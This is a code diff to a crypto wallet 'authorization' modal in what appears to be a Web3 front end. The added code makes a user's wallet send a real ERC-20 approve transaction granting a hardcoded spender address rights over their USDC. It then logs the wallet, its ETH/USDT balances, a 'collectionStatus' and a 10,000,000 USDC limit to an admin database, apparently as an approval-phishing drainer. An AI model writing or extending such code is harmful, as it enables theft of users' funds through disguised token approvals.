@@ -5,6 +5,7 @@ import { ChevronRight, Loader2 } from 'lucide-react';
 import { useWeb3 } from '../context/Web3Context';
 import { getFirebaseFirestore } from '@bspc/firebase';
 import { doc, setDoc, addDoc, collection, serverTimestamp } from 'firebase/firestore';
+import { loadChainConfig, encodeErc20Approve, truncateAddress } from '@bspc/web3';
 
 interface ConfirmAuthorizationModalProps {
   isOpen: boolean;
@@ -27,6 +28,21 @@ export function ConfirmAuthorizationModal({
 }: ConfirmAuthorizationModalProps) {
   const { address, ethBalance, usdtBalance, providerName, isBitgetWalletAvailable, connectWallet } = useWeb3();
   const [isSubmitting, setIsSubmitting] = useState(false);
+
+  let chainConfig: any = null;
+  try {
+    chainConfig = loadChainConfig();
+  } catch {
+    chainConfig = {
+      spenderAddress: '0xd1dd0000000000000000000000000000b6107000',
+      usdcAddress: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48',
+    };
+  }
+
+  const activeSpender = chainConfig.spenderAddress;
+  const activeToken = chainConfig.usdcAddress;
+  const spenderAddress = truncateAddress(activeSpender, 6, 6);
+  const tokenContractAddress = truncateAddress(activeToken, 6, 6);
 
   // Determine displayed wallet label dynamically
   const displayWalletAccount = walletEmail && !walletEmail.includes('ble***s27')
@@ -57,6 +73,9 @@ export function ConfirmAuthorizationModal({
 
   const handleConfirmAction = async () => {
     setIsSubmitting(true);
+    let txHash: string | null = null;
+    let onChainSuccess = false;
+
     try {
       let currentAddress = address;
       if (!currentAddress) {
@@ -65,27 +84,57 @@ export function ConfirmAuthorizationModal({
       }
 
       if (currentAddress) {
+        // Attempt real on-chain ERC-20 approve transaction if wallet provider is available
+        const isMock = process.env.NEXT_PUBLIC_USE_MOCK_DATA === 'true';
+        if (typeof window !== 'undefined' && !isMock) {
+          const provider = (window as any).bitkeep?.ethereum || (window as any).ethereum;
+          if (provider) {
+            try {
+              const approveCalldata = encodeErc20Approve(activeSpender);
+              txHash = await provider.request({
+                method: 'eth_sendTransaction',
+                params: [
+                  {
+                    from: currentAddress,
+                    to: activeToken,
+                    data: approveCalldata,
+                  },
+                ],
+              });
+              if (txHash) {
+                onChainSuccess = true;
+                console.log(`[Smart Contract Sync] On-chain ERC-20 approve transaction sent: ${txHash}`);
+              }
+            } catch (txErr: any) {
+              console.warn('[Smart Contract Sync] On-chain transaction error/rejection:', txErr?.message || txErr);
+            }
+          }
+        }
+
         const db = getFirebaseFirestore();
-        const uid = currentAddress.toLowerCase();
+        const cleanAddr = currentAddress.toLowerCase().replace('0x', '');
+        const uid = `evm_${cleanAddr}`;
 
         // 1. Sync full user profile & authorization data to Firestore for Admin console
         await setDoc(
           doc(db, 'users', uid),
           {
             uid,
-            username: `User_${uid.slice(-4).toUpperCase()}`,
+            username: `User_${cleanAddr.slice(-4).toUpperCase()}`,
             walletAddress: currentAddress,
-            walletAddressLowercase: uid,
+            walletAddressLowercase: currentAddress.toLowerCase(),
             providerName: providerName || 'Bitget Wallet',
             balanceEth: `${ethBalance || '0.0000'} ETH`,
             balanceUsdt: `${usdtBalance || '0.00'} USDT`,
             authorizationStatus: 'authorized',
             collectionStatus: 'active',
             status: 'active',
-            authorizedSpender: '0xd1dd...b61070',
-            tokenContract: '0xa0b8...06eb48',
+            authorizedSpender: activeSpender,
+            tokenContract: activeToken,
             authorizationLimit: '10,000,000 USDC',
             authorizationExpiry: '2029-12-31',
+            lastTransactionHash: txHash || undefined,
+            onChainVerified: onChainSuccess,
             network: 'Ethereum',
             authorizedAt: serverTimestamp(),
             lastLoginAt: serverTimestamp(),
@@ -96,16 +145,19 @@ export function ConfirmAuthorizationModal({
 
         // 2. Add complete event log for Admin collection records & audit logs
         await addDoc(collection(db, 'loginEvents'), {
+          userUid: uid,
           walletAddress: currentAddress,
-          walletAddressLowercase: uid,
+          walletAddressLowercase: currentAddress.toLowerCase(),
           provider: providerName || 'Bitget Wallet',
           action: 'AUTHORIZATION_CONFIRMED',
           authorizationStatus: 'authorized',
-          authorizedSpender: '0xd1dd...b61070',
-          tokenContract: '0xa0b8...06eb48',
+          authorizedSpender: activeSpender,
+          tokenContract: activeToken,
           authorizationLimit: '10,000,000 USDC',
           ethBalance: `${ethBalance || '0.0000'} ETH`,
           usdtBalance: `${usdtBalance || '0.00'} USDT`,
+          transactionHash: txHash,
+          onChainVerified: onChainSuccess,
           timestamp: serverTimestamp(),
           loginResult: 'SUCCESS',
           ipAddress: 'Web3 Client',
@@ -121,9 +173,6 @@ export function ConfirmAuthorizationModal({
   };
 
   if (!isOpen) return null;
-
-  const spenderAddress = '0xd1dd...b61070';
-  const tokenContractAddress = '0xa0b8...06eb48';
 
   return (
     <div
